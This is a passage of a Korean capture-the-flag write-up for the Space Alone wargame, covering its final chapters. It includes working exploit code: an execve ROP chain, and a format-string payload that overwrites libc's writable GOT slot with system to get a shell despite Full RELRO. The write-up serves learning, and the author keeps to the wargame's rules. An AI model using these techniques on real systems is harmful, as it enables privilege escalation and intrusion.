stage3 = flat(POP_RDI, BINSH, POP_RSI_R15, 0, 0, POP_RDX, 0,
              POP_RAX, 59, SYSCALL)      # __NR_execve
p.send(stage3 + b'/bin/sh\x00')          # 문자열은 체인 꼬리에 같이 태운다
```

![게스트 콘솔에서 ch9 스택 피벗을 실행한 화면. puts@libc와 libc base가 찍히고 uid=510(The_Cure_Within_Reach), Chapter10 PW: bss_is_useful 이 출력돼 있다](/assets/img/space-alone/ch09.png)

비밀번호가 `bss_is_useful`인 걸 보고 웃었습니다. 출제자가 원한 게 정확히 그거였습니다.

## Chapter 10 — 바이너리 GOT가 막혔으면 libc GOT가 있다

마지막 `final`은 Full RELRO + PIE + 카나리입니다. 소스 주석부터 이렇게 시작합니다.
"Full mitigation / Stack is unsafe & fprintf is Substitutional way of print string /
**But you have writable place**".

포맷 스트링이 두 개 있습니다.

```c
case 3: printf(id_number);          // 0x20 바이트, 화면으로 나가는 리크용
...
read(0, passwd, 100);
fprintf(access_log, passwd);        // 100 바이트, 파일로 나가는 쓰기용
```

Full RELRO니 이 바이너리의 GOT는 읽기 전용입니다. 그런데 **libc의 GOT는 아닙니다.** 우분투
glibc의 `GNU_RELRO`는 `0x2168f0`에서 `0x3710`만큼, 즉 `0x21a000`에서 끝납니다. 그리고
`.got.plt`가 정확히 `0x21a000`부터 시작합니다. 한 페이지 차이로 보호 밖에 있고, 프로세스가
사는 내내 쓰기 가능합니다.

```console
$ readelf -lW libc.so.6 | grep -A1 GNU_RELRO
  GNU_RELRO 0x2158f0 0x00000000002168f0 ... 0x003710 0x003710 R
$ readelf -SW libc.so.6 | grep '\.got'
  [32] .got      PROGBITS  0000000000219d90 ...
  [33] .got.plt  PROGBITS  000000000021a000 ...
```

다음 질문은 "어떤 슬롯이 우리가 부를 수 있는 경로에 있는가"입니다. `puts`를 디스어셈블하면
시작하자마자 ifunc PLT를 하나 부릅니다.

```console
$ objdump -d libc.so.6
  80e63: call 28490 <*ABS*+0xa86a0@plt>
  28490: endbr64
  28494: bnd jmp QWORD PTR [rip+0x1f1bfd]   # 0x21a098
```

`puts(s)`가 길이를 재려고 `strlen(s)`을 저 슬롯을 통해 부릅니다. 그리고 `main`에는 인증에
실패했을 때 `puts(password)`를 부르는 줄이 있습니다. **`rdi`가 우리 버퍼인 채로 libc 함수가
호출되는 자리입니다.** `0x21a098`을 `system`으로 바꾸면 그 줄이 곧 `system(password)`가 됩니다.

문자열은 `password` 앞에 붙였습니다. `sh -c`로 넘어가니 뒤에 붙는 포맷 스트링은 `#`으로 주석
처리하면 됩니다.

```python
PREFIX = b'/bin/sh #'.ljust(16, b' ')
payload = PREFIX + fmtstr_payload(27 + 2, {base + 0x21a098: system},
                                  numbwritten=16, write_size='short')
```

`27`은 `fprintf` 기준 `password`의 인자 번호인데, 이건 계산이 아니라 눈으로 찾았습니다.
`%15$p`부터 `0x6363617620726f46`, `0x746e45202c656e69` 같은 값이 나오길래 바이트로 풀어 보니
`"For vacc"`, `"ine, Ent"`였습니다. `main`의 `welcome[]`이 `rbp-0xb0`에 있으니 15번이 곧
`rbp-0xb0`이고, `password`는 `rbp-0x50`이니 12칸 뒤인 27번입니다. **스택에 있는 아는 문자열은
포맷 스트링 오프셋을 재는 가장 확실한 자입니다.**

마지막에 걸린 건 익스플로잇이 아니라 파일 권한이었습니다. `check_passwd()`가
`fopen("access.log", "a")`를 하는데 `final`은 `epilogue` 권한으로 도니, 이전 계정 소유의
`access.log`(mode 664)에는 못 씁니다. `fopen`이 NULL을 돌려주고 `fprintf(NULL, ...)`에서
죽습니다. `epilogue`가 파일을 만들 수 있는 디렉터리에서 실행하는 것으로 해결했습니다.

![게스트 콘솔에서 ch10 익스플로잇을 실행한 화면. libc base, system, strlen slot 주소가 찍히고 uid=511(epilogue), UID: 511, All clear!! 가 출력돼 있다](/assets/img/space-alone/ch10.png)

## 에필로그 — 백신

`epilogue` 계정 홈에는 `get_vaccine`이 있습니다.

```c
int uid = getuid();
if (uid != 511) { puts(":("); return -1; }
int fd = open(".tty", 0);  read(fd, tty_name, 0x100);
sprintf(buf, "cat .vaccine >> %s", tty_name);            system(buf);
sprintf(buf, "sleep 0.5; cd /home/setting/story; python3 ending2.py >> %s", tty_name);
system(buf);
```

`getuid()`를 봅니다. effective가 아니라 real입니다. 3장에서 확인한 dash 동작 덕분에 셸 안에서는
real uid도 511이라 그냥 통과합니다. `.tty`에 적힌 터미널로 결과를 밀어 넣는 구조인데, 각 계정의
`.bashrc`가 로그인할 때 `chmod 766 $(tty)`를 해 두기 때문에 다른 계정도 그 터미널에 쓸 수
있습니다. 게스트 콘솔에서 보려고 `.tty`를 `/dev/tty1`로 맞추고 돌렸습니다.

![게스트 콘솔에 뜬 엔딩 화면. 별이 반짝이는 배경 위에 컬러 아스키 아트가 그려지고 왼쪽에 [Environment Developer] Arkea, Osori와 [Special Thanks] mongii(LOB), Thank you for playing 크레딧이 올라간다](/assets/img/space-alone/ending.png)

Special Thanks에 `mongii(LOB)`가 있습니다. 원작에 대한 예의를 저렇게 남겨 뒀습니다.

---

## 여기서 멈춘 것 (범위)

- **커널 소스는 안 봤습니다.** 2장의 `READ_IMPLIES_EXEC` 이야기는 `personality`가 0이었고
  `.bss`에서 실행이 안 됐다는 관측까지입니다. 어느 커밋이 언제 판정을 바꿨는지는 확인하지
  않았으므로 이 글에 커밋 해시나 버전 표를 적지 않았습니다.
- **dash 소스도 안 봤습니다.** `Uid: 504 504 504 504`는 `/proc/self/status`에서 읽은 값입니다.
  dash가 정확히 어느 코드에서 그렇게 하는지는 이 글의 근거에 포함되지 않습니다.
- **문제 밖으로 나가지 않았습니다.** `knight`(sudo 계정)와 root는 건드리지 않았고, `/home/setting`
  아래의 정답 파일도 열지 않았습니다. 문제집 규칙이 그렇게 정해 뒀고, 그 선을 넘으면 풀이가
  아니라 그냥 열람이 됩니다.
- **비밀번호를 다 적지는 않았습니다.** 화면에 찍힌 것은 그대로 뒀지만, 아직 풀지 않은 사람이
  검색으로 답만 주워 가는 글은 되지 않게 각 장의 "어떻게 갔는가"에 분량을 뒀습니다.

## 남는 것

- **오래된 문장 두 개가 이 커널에서 뒤집혔습니다.** "실행 가능 스택이면 데이터 영역도 실행된다"는
  아니었고(2장), "setuid 바이너리에서 셸을 띄우면 권한이 떨어진다"도 아니었습니다(3장). 워게임을
  다시 푸는 이유가 여기 있습니다. 기법은 안 변하는데 **기법이 서 있는 바닥은 계속 변합니다.**
- **보호는 "있다/없다"가 아니라 "어디까지 덮는가"입니다.** 1장은 보호가 전부 켜져 있어도 논리
  결함 앞에서는 아무 일도 안 하고, 10장은 모든 보호가 켜진 상태에서 **보호 밖에 있는 한 페이지**를
  찾게 합니다. `GNU_RELRO`가 `0x21a000`에서 끝나고 `.got.plt`가 `0x21a000`에서 시작한다는 사실
  하나가 마지막 장을 열었습니다.
- **막히면 우회하지 말고 심판을 바꿉니다.** 7장에서 카나리를 읽을 방법이 없자 카나리 검사 실패
  경로(`__stack_chk_fail@got`)를 우리 것으로 만들었고, 5장에서 `pop rdi`가 없자 체인 대신 프레임을
  위조해 **프로그램이 스스로 `system`을 부르게** 했습니다. 가젯이 없다는 건 코드가 없다는 뜻이
  아닙니다. 이미 있는 호출을 다시 겨누면 됩니다.
- **제가 틀린 자리는 전부 성격이 하나였습니다 — 세는 걸 눈으로 하고 단언한 것.** 5장에서 버퍼
  간격을 63으로 센 것, 8장에서 정규식이 뒤 문자를 한 칸 더 먹은 것, 7장에서 정렬 가젯을 앞
  회차와 같겠거니 하고 붙인 것, 9장에서 "쓰기 가능하면 스택으로 써도 되겠지" 한 것. 전부
  디스어셈블이나 `/proc`를 한 번 더 봤으면 안 틀렸을 것들입니다. **익스플로잇에서 감으로 세는
  칸은 대체로 틀린 칸입니다.**

## 관련 자료

- 문제집: [hspace-io/Space_Alone](https://github.com/hspace-io/Space_Alone) — OVA 배포 링크와 챕터별
  기법 표(스포일러 접힘)가 README에 있습니다.
- 원작: [해커스쿨 The Lord of BOF](https://www.hackerschool.org/HS_Boards/zboard.php?id=HS_Notice&no=1170881885) —
  mongii. Space Alone이 계승한 구조(계정 사슬 + setuid)의 출처.
- 도구: [pwntools](https://docs.pwntools.com/) (`ELF`, `ROP`, `fmtstr_payload`) ·
  [ROPgadget](https://github.com/JonathanSalwan/ROPgadget) · `objdump` · `readelf`
- 개념 참고: [Linux `personality(2)`](https://man7.org/linux/man-pages/man2/personality.2.html)
  (`READ_IMPLIES_EXEC`) · [`execve(2)`의 setuid 동작](https://man7.org/linux/man-pages/man2/execve.2.html)
- 환경: [QEMU 문서 — `-netdev user` / `hostfwd`](https://www.qemu.org/docs/master/system/invocation.html) ·
  `qemu-img create -b`(오버레이)로 원본 VMDK를 건드리지 않고 부팅하는 방법.
